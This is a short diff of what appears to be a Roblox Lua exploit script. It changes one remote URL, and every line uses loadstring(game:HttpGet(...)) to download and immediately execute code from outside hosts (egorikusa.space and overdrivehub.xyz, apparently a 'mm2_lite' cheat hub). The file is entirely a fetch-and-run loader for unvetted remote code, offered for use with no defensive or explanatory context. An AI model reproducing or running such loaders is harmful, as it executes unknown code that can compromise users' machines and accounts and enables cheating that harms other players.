@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("https://egorikusa.space/38c306a08a0dbbf06d033dff.lua", true))()
+loadstring(game:HttpGet("https://egorikusa.space/57b64a659f3d32b1cc18839e.lua", true))()
 loadstring(game:HttpGet("https://overdrivehub.xyz/?d=auth&script=mm2_lite"))()
